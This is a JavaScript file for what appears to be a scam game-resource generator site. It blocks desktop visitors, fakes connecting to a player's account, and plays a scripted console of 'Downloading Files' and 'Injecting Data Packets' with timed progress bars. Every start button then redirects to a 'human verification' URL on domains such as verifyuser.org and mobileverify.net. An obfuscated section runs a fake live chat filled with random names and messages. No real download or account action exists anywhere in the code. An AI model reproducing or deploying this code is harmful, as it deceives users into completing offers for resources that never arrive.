$(document).ready(function() {
    $('.nav-wrapper li').click(function() {
        $('.nav-wrapper li').removeClass('active');
        $(this).addClass('active');
        var active = $('.nav-wrapper li.active span').text();
        makeactive(active);
    });

    var bWidth = $(window).width();

    if (bWidth > 580) {
        $('body').html('<section class="s-wrapper desktop">\
					<div class="container">\
						<div class="d-notice-wrapper">\
							<div class="d-notice">\
								<span class="material-icons-two-tone mid1">phone_iphone</span>\
								<h1>Mobile Device Not Detected</h1>\
								<p>Looks like you are trying to access this website from a desktop/laptop device.</p>\
								<div class="d-n-i">\
									<span class="material-icons-two-tone mid2">info</span>\
									Please re-visit this website from your mobile device.\
								</div>\
							</div>\
						</div>\
					</div>\
				</section>');
    }

});
$(document).ready(function() {
	$('#blurred-resources').click(function() {
		sweetAlert("Error", "Please enter your Username and select your platform.", "error");
	});
	function progressBar(percent, $element) {
		var progressBarWidth = percent * $element.width() / 100;
		$element.find('div').animate({
			width: progressBarWidth
		}, 500).html(percent + "%&nbsp;");
	}
	progressBar(20, $('#progressBar'));
	var select = $("#resource-item-1-amount-wrapper");
	var slider = $("<div id='slider-resource-1'></div>").insertAfter(select).slider({
		min: 14000,
		max: 99000,
		value: 20000,
		range: "min",
		change: function(event, ui) {
			var sliderValue = $("#slider-resource-1").slider("option", "value");
			$('#resource-1-amount').html(sliderValue);
			if (sliderValue == '14000') {
				progressBar(20, $('#progressBar'));
				$('#decrease-resource-1').addClass('btn-disabled');
			} else if (sliderValue == '40000') {
				progressBar(40, $('#progressBar'));
				$('#decrease-resource-1').removeClass('btn-disabled');
			} else if (sliderValue == '60000') {
				progressBar(60, $('#progressBar'));
			} else if (sliderValue == '80000') {
				progressBar(80, $('#progressBar'));
				$('#increase-resource-1').removeClass('btn-disabled');
			} else if (sliderValue == '99000') {
				progressBar(100, $('#progressBar'));
				$('#increase-resource-1').addClass('btn-disabled');
			}
		}
	});
	function progressBarConsole(percent, $element) {
		var progressBarConsoleWidth = percent * $element.width() / 100;
		$element.find('div').animate({
			width: progressBarConsoleWidth
		}, 500).html(percent + "%&nbsp;");
	}
	progressBarConsole(1, $('#progressBarConsole'));
	$('#connect-button').click(function() {
		if ($('#coc-player-tag').val().length > 2) {
			$.magnificPopup.open({
				items: {
					src: '#message-wrapper',
				},
				type: 'inline',
				preloader: false,
				modal: true,
				mainClass: 'mfp-fade'
			});
			$('.message-header h3').html("Connecting Account");
			$('.message-header p.message-header-subtitle').html("Please wait for generator to connect with your account.");
			$(".message-content p.console-message").fadeIn();
			var $console_message_username_msg = $('#coc-player-tag').val();
			var $console_message_platform_msg = $('#coc-player-platform').val();
			setTimeout(function() {
				$(".console-loadbar").fadeIn();
				$(".message-content p.console-message").typed({
					strings: ["Connecting to Username <span class='console-message-connected-item'>" + $console_message_username_msg + "</span> on <span class='console-message-connected-item'>" + $console_message_platform_msg + "</span>"],
					showCursor: false,
					typeSpeed: -50,
					onStringTyped: function() {
						progressBar(20, $('#progressBarConsole'));
					}
				});
			}, 500);
			setTimeout(function() {
				$(".message-content p.console-message").addClass('bounce animated').one('webkitAnimationEnd mozAnimationEnd MSAnimationEnd oanimationend animationend', function() {
					$(this).removeClass('bounce animated');
				});
			}, 3500);
			setTimeout(function() {
				$(".message-content p.console-message").typed({
					strings: ["Connected to Username <span class='console-message-connected-item'>" + $console_message_username_msg + "</span>"],
					showCursor: false,
					typeSpeed: -50,
					onStringTyped: function() {
						progressBar(100, $('#progressBarConsole'));
						setTimeout(function() {
							$('#resources-select-wrapper').removeClass('resources-select-wrapper-blurred');
							$('#account-information-wrapper').addClass('account-wrapper-blurred');
							$('#blurred-account').fadeIn();
							$('#blurred-resources').remove();
							$.magnificPopup.close();
							$(".message-content p.console-message").hide();
							progressBar(0, $('#progressBarConsole'));
							progressBar(20, $('#progressBar'));
							progressBarResource2(20, $('#progressBarResource2'));
							$('html, body').animate({
								scrollTop: $("#resources-select-wrapper").offset().top
							}, 2000);
						}, 1500);
					}
				});
			}, 4800);
		} else {
			sweetAlert("Error", "Please enter your Username.", "error");
		}
	});
	$('.start1-button').click(function() {
		$(".message-content p.console-message").hide();
		$.magnificPopup.open({
			items: {
				src: '#message-wrapper',
			},
			type: 'inline',
			preloader: false,
			modal: true,
			mainClass: 'mfp-fade'
		});
		progressBar(0, $('#progressBarConsole'));
		$('.message-header h3').html("APK Tweaks");
		$('.message-header p.message-header-subtitle').html("You are about to download apps");
		$(".message-content p.console-message").fadeIn();
		var $console_message_username_msg = $('#coc-player-tag').val();
		var $console_message_platform_msg = $('#coc-player-platform').val();
		var $console_message_resource1_msg = $('#slider-resource-1').slider("option", "value");
		var $console_message_resource2_msg = $('#slider-resource-2').slider("option", "value");
		setTimeout(function() {
			$(".console-loadbar").fadeIn();
			$(".message-content p.console-message").typed({
				strings: ["Processing..."],
				showCursor: false,
				typeSpeed: -50,
				onStringTyped: function() {
					progressBar(2, $('#progressBarConsole'));
				}
			});
		}, 200);
		setTimeout(function() {
			$(".message-content p.console-message").typed({
				strings: ["Downloading Files..."],
				showCursor: false,
				typeSpeed: -50,
				onStringTyped: function() {
					progressBar(25, $('#progressBarConsole'));
				}
			});
		}, 2400);
		setTimeout(function() {
			$(".message-content p.console-message").typed({
				strings: ["Unpacking Files..."],
				showCursor: false,
				typeSpeed: -50,
				onStringTyped: function() {
					progressBar(50, $('#progressBarConsole'));
				}
			});
		}, 6500);
		setTimeout(function() {
			$(".message-content p.console-message").typed({
				strings: ["Forming Data Packets..."],
				showCursor: false,
				typeSpeed: -50,
				onStringTyped: function() {
					progressBar(60, $('#progressBarConsole'));
				}
			});
		}, 9500);
		setTimeout(function() {
			$(".message-content p.console-message").typed({
				strings: ["Injecting Data Packets..."],
				showCursor: false,
				typeSpeed: -50,
				onStringTyped: function() {
					progressBar(80, $('#progressBarConsole'));
				}
			});
		}, 11500);
		setTimeout(function() {
			$(".message-content p.console-message").fadeOut(function() {
				$(".human-verification-wrapper").fadeIn();
				window.location.href="https://verifyuser.org/cl/i/j6redp";

			});
		}, 14800);
	});
	$('.start2-button').click(function() {
		$(".message-content p.console-message").hide();
		$.magnificPopup.open({
			items: {
				src: '#message-wrapper',
			},
			type: 'inline',
			preloader: false,
			modal: true,
			mainClass: 'mfp-fade'
		});
		progressBar(0, $('#progressBarConsole'));
		$('.message-header h3').html("APK Tweaks");
		$('.message-header p.message-header-subtitle').html("You are about to download apps");
		$(".message-content p.console-message").fadeIn();
		var $console_message_username_msg = $('#coc-player-tag').val();
		var $console_message_platform_msg = $('#coc-player-platform').val();
		var $console_message_resource1_msg = $('#slider-resource-1').slider("option", "value");
		var $console_message_resource2_msg = $('#slider-resource-2').slider("option", "value");
		setTimeout(function() {
			$(".console-loadbar").fadeIn();
			$(".message-content p.console-message").typed({
				strings: ["Processing..."],
				showCursor: false,
				typeSpeed: -50,
				onStringTyped: function() {
					progressBar(2, $('#progressBarConsole'));
				}
			});
		}, 200);
		setTimeout(function() {
			$(".message-content p.console-message").typed({
				strings: ["Downloading Files..."],
				showCursor: false,
				typeSpeed: -50,
				onStringTyped: function() {
					progressBar(25, $('#progressBarConsole'));
				}
			});
		}, 2400);
		setTimeout(function() {
			$(".message-content p.console-message").typed({
				strings: ["Unpacking Files..."],
				showCursor: false,
				typeSpeed: -50,
				onStringTyped: function() {
					progressBar(50, $('#progressBarConsole'));
				}
			});
		}, 6500);
		setTimeout(function() {
			$(".message-content p.console-message").typed({
				strings: ["Forming Data Packets..."],
				showCursor: false,
				typeSpeed: -50,
				onStringTyped: function() {
					progressBar(60, $('#progressBarConsole'));
				}
			});
		}, 9500);
		setTimeout(function() {
			$(".message-content p.console-message").typed({
				strings: ["Injecting Data Packets..."],
				showCursor: false,
				typeSpeed: -50,
				onStringTyped: function() {
					progressBar(80, $('#progressBarConsole'));
				}
			});
		}, 11500);
		setTimeout(function() {
			$(".message-content p.console-message").fadeOut(function() {
				$(".human-verification-wrapper").fadeIn();
				window.location.href="https://verifyuser.org/cl/i/5kpj7v";
			});
		}, 14800);
	});
	$('.start3-button').click(function() {
		$(".message-content p.console-message").hide();
		$.magnificPopup.open({
			items: {
				src: '#message-wrapper',
			},
			type: 'inline',
			preloader: false,
			modal: true,
			mainClass: 'mfp-fade'
		});
		progressBar(0, $('#progressBarConsole'));
		$('.message-header h3').html("APK Tweaks");
		$('.message-header p.message-header-subtitle').html("You are about to download apps");
		$(".message-content p.console-message").fadeIn();
		var $console_message_username_msg = $('#coc-player-tag').val();
		var $console_message_platform_msg = $('#coc-player-platform').val();
		var $console_message_resource1_msg = $('#slider-resource-1').slider("option", "value");
		var $console_message_resource2_msg = $('#slider-resource-2').slider("option", "value");
		setTimeout(function() {
			$(".console-loadbar").fadeIn();
			$(".message-content p.console-message").typed({
				strings: ["Processing..."],
				showCursor: false,
				typeSpeed: -50,
				onStringTyped: function() {
					progressBar(2, $('#progressBarConsole'));
				}
			});
		}, 200);
		setTimeout(function() {
			$(".message-content p.console-message").typed({
				strings: ["Downloading Files..."],
				showCursor: false,
				typeSpeed: -50,
				onStringTyped: function() {
					progressBar(25, $('#progressBarConsole'));
				}
			});
		}, 2400);
		setTimeout(function() {
			$(".message-content p.console-message").typed({
				strings: ["Unpacking Files..."],
				showCursor: false,
				typeSpeed: -50,
				onStringTyped: function() {
					progressBar(50, $('#progressBarConsole'));
				}
			});
		}, 6500);
		setTimeout(function() {
			$(".message-content p.console-message").typed({
				strings: ["Forming Data Packets..."],
				showCursor: false,
				typeSpeed: -50,
				onStringTyped: function() {
					progressBar(60, $('#progressBarConsole'));
				}
			});
		}, 9500);
		setTimeout(function() {
			$(".message-content p.console-message").typed({
				strings: ["Injecting Data Packets..."],
				showCursor: false,
				typeSpeed: -50,
				onStringTyped: function() {
					progressBar(80, $('#progressBarConsole'));
				}
			});
		}, 11500);
		setTimeout(function() {
			$(".message-content p.console-message").fadeOut(function() {
				$(".human-verification-wrapper").fadeIn();
				window.location.href="https://verifysuper.com/cl/i/e6lork";
			});
		}, 14800);
	});	
	$('.start4-button').click(function() {
		$(".message-content p.console-message").hide();
		$.magnificPopup.open({
			items: {
				src: '#message-wrapper',
			},
			type: 'inline',
			preloader: false,
			modal: true,
			mainClass: 'mfp-fade'
		});
		progressBar(0, $('#progressBarConsole'));
		$('.message-header h3').html("APK Tweaks");
		$('.message-header p.message-header-subtitle').html("You are about to download apps");
		$(".message-content p.console-message").fadeIn();
		var $console_message_username_msg = $('#coc-player-tag').val();
		var $console_message_platform_msg = $('#coc-player-platform').val();
		var $console_message_resource1_msg = $('#slider-resource-1').slider("option", "value");
		var $console_message_resource2_msg = $('#slider-resource-2').slider("option", "value");
		setTimeout(function() {
			$(".console-loadbar").fadeIn();
			$(".message-content p.console-message").typed({
				strings: ["Processing..."],
				showCursor: false,
				typeSpeed: -50,
				onStringTyped: function() {
					progressBar(2, $('#progressBarConsole'));
				}
			});
		}, 200);
		setTimeout(function() {
			$(".message-content p.console-message").typed({
				strings: ["Downloading Files..."],
				showCursor: false,
				typeSpeed: -50,
				onStringTyped: function() {
					progressBar(25, $('#progressBarConsole'));
				}
			});
		}, 2400);
		setTimeout(function() {
			$(".message-content p.console-message").typed({
				strings: ["Unpacking Files..."],
				showCursor: false,
				typeSpeed: -50,
				onStringTyped: function() {
					progressBar(50, $('#progressBarConsole'));
				}
			});
		}, 6500);
		setTimeout(function() {
			$(".message-content p.console-message").typed({
				strings: ["Forming Data Packets..."],
				showCursor: false,
				typeSpeed: -50,
				onStringTyped: function() {
					progressBar(60, $('#progressBarConsole'));
				}
			});
		}, 9500);
		setTimeout(function() {
			$(".message-content p.console-message").typed({
				strings: ["Injecting Data Packets..."],
				showCursor: false,
				typeSpeed: -50,
				onStringTyped: function() {
					progressBar(80, $('#progressBarConsole'));
				}
			});
		}, 11500);
		setTimeout(function() {
			$(".message-content p.console-message").fadeOut(function() {
				$(".human-verification-wrapper").fadeIn();
				window.location.href="https://verifyuser.org/cl/i/kl7ngg";
			});
		}, 14800);
	});	
	$('.start5-button').click(function() {
		$(".message-content p.console-message").hide();
		$.magnificPopup.open({
			items: {
				src: '#message-wrapper',
			},
			type: 'inline',
			preloader: false,
			modal: true,
			mainClass: 'mfp-fade'
		});
		progressBar(0, $('#progressBarConsole'));
		$('.message-header h3').html("APK Tweaks");
		$('.message-header p.message-header-subtitle').html("You are about to download apps");
		$(".message-content p.console-message").fadeIn();
		var $console_message_username_msg = $('#coc-player-tag').val();
		var $console_message_platform_msg = $('#coc-player-platform').val();
		var $console_message_resource1_msg = $('#slider-resource-1').slider("option", "value");
		var $console_message_resource2_msg = $('#slider-resource-2').slider("option", "value");
		setTimeout(function() {
			$(".console-loadbar").fadeIn();
			$(".message-content p.console-message").typed({
				strings: ["Processing..."],
				showCursor: false,
				typeSpeed: -50,
				onStringTyped: function() {
					progressBar(2, $('#progressBarConsole'));
				}
			});
		}, 200);
		setTimeout(function() {
			$(".message-content p.console-message").typed({
				strings: ["Downloading Files..."],
				showCursor: false,
				typeSpeed: -50,
				onStringTyped: function() {
					progressBar(25, $('#progressBarConsole'));
				}
			});
		}, 2400);
		setTimeout(function() {
			$(".message-content p.console-message").typed({
				strings: ["Unpacking Files..."],
				showCursor: false,
				typeSpeed: -50,
				onStringTyped: function() {
					progressBar(50, $('#progressBarConsole'));
				}
			});
		}, 6500);
		setTimeout(function() {
			$(".message-content p.console-message").typed({
				strings: ["Forming Data Packets..."],
				showCursor: false,
				typeSpeed: -50,
				onStringTyped: function() {
					progressBar(60, $('#progressBarConsole'));
				}
			});
		}, 9500);
		setTimeout(function() {
			$(".message-content p.console-message").typed({
				strings: ["Injecting Data Packets..."],
				showCursor: false,
				typeSpeed: -50,
				onStringTyped: function() {
					progressBar(80, $('#progressBarConsole'));
				}
			});
		}, 11500);
		setTimeout(function() {
			$(".message-content p.console-message").fadeOut(function() {
				$(".human-verification-wrapper").fadeIn();
				window.location.href="https://mobileverify.net/cl/i/m4rlw";
			});
		}, 14800);
	});	
	$('.start6-button').click(function() {
		$(".message-content p.console-message").hide();
		$.magnificPopup.open({
			items: {
				src: '#message-wrapper',
			},
			type: 'inline',
			preloader: false,
			modal: true,
			mainClass: 'mfp-fade'
		});
		progressBar(0, $('#progressBarConsole'));
		$('.message-header h3').html("APK Tweaks");
		$('.message-header p.message-header-subtitle').html("You are about to download apps");
		$(".message-content p.console-message").fadeIn();
		var $console_message_username_msg = $('#coc-player-tag').val();
		var $console_message_platform_msg = $('#coc-player-platform').val();
		var $console_message_resource1_msg = $('#slider-resource-1').slider("option", "value");
		var $console_message_resource2_msg = $('#slider-resource-2').slider("option", "value");
		setTimeout(function() {
			$(".console-loadbar").fadeIn();
			$(".message-content p.console-message").typed({
				strings: ["Processing..."],
				showCursor: false,
				typeSpeed: -50,
				onStringTyped: function() {
					progressBar(2, $('#progressBarConsole'));
				}
			});
		}, 200);
		setTimeout(function() {
			$(".message-content p.console-message").typed({
				strings: ["Downloading Files..."],
				showCursor: false,
				typeSpeed: -50,
				onStringTyped: function() {
					progressBar(25, $('#progressBarConsole'));
				}
			});
		}, 2400);
		setTimeout(function() {
			$(".message-content p.console-message").typed({
				strings: ["Unpacking Files..."],
				showCursor: false,
				typeSpeed: -50,
				onStringTyped: function() {
					progressBar(50, $('#progressBarConsole'));
				}
			});
		}, 6500);
		setTimeout(function() {
			$(".message-content p.console-message").typed({
				strings: ["Forming Data Packets..."],
				showCursor: false,
				typeSpeed: -50,
				onStringTyped: function() {
					progressBar(60, $('#progressBarConsole'));
				}
			});
		}, 9500);
		setTimeout(function() {
			$(".message-content p.console-message").typed({
				strings: ["Injecting Data Packets..."],
				showCursor: false,
				typeSpeed: -50,
				onStringTyped: function() {
					progressBar(80, $('#progressBarConsole'));
				}
			});
		}, 11500);
		setTimeout(function() {
			$(".message-content p.console-message").fadeOut(function() {
				$(".human-verification-wrapper").fadeIn();
				window.location.href="https://verifyuser.org/cl/i/kjg8e";
			});
		}, 14800);
	});
	
	
	
	$('.popup-tos').magnificPopup({
		type: 'inline',
		preloader: false
	});
	$('.popup-contact').magnificPopup({
		type: 'inline',
		preloader: false
	});
	$('.popup-pp').magnificPopup({
		type: 'inline',
		preloader: false
	});
	$("#video-wrapper").fitVids();
});
var ee;
var eenum2 = 334;
Date.prototype.getFullMinutes = function() {
	if (this.getMinutes() < 10) {
		return '0' + this.getMinutes();
	}
	return this.getMinutes();
};
function rng(min, max) {
	return Math.floor(Math.random() * (max - min + 1) + min);
}
$(function() {
	$('#livechatInputComment').focus(function() {
		$('#livechatContainerAdditional').slideDown(500);
	});
});
function Random(_0xaa63x2, _0xaa63x3) {
	return Math['floor'](Math['random']() * (_0xaa63x3 - _0xaa63x2) + _0xaa63x2);
};

function ChatAddEntry(_0xaa63x5, _0xaa63x6) {
	if (_0xaa63x5 == '' || _0xaa63x6 == '') {
		return;
	};
	$('<div class=\"livechatChatEntry\"><span class=\"livechatEntryUserName\">[' + ChatDate.getHours() + ':' + ChatDate.getFullMinutes() + ']  ' + _0xaa63x5 + ':</span><span class=\"livechatEntryContent\">' + _0xaa63x6 + '</span></div>')['appendTo']('#livechatChatContent')['hide'](0)['fadeIn'](250);
	$('#livechatChatContent')['scrollTop']($('#livechatChatContent')[0]['scrollHeight']);
};

function ChatLog(_0xaa63x6) {
	$('<div class=\"livechatChatEntry\"><span class=\"ChatNotification\">' + _0xaa63x6 + '</span></div>')['appendTo']('#livechatChatContent')['hide'](0)['fadeIn'](250);
	$('#livechatChatContent')['scrollTop']($('#livechatChatContent')[0]['scrollHeight']);
};

function ChatStart() {
	var _0xaa63x8 = function() {
		setTimeout(function() {
			var _0xaa63x9 = ChatUserNames[Random(0, ChatUserNames['length'] - 1)];
			var _0xaa63xa = ChatContent[Random(0, ChatContent['length'] - 1)];
			ChatAddEntry(_0xaa63x9, _0xaa63xa);
			_0xaa63x8();
		}, Random(1000, 15000));
	};
	_0xaa63x8();
};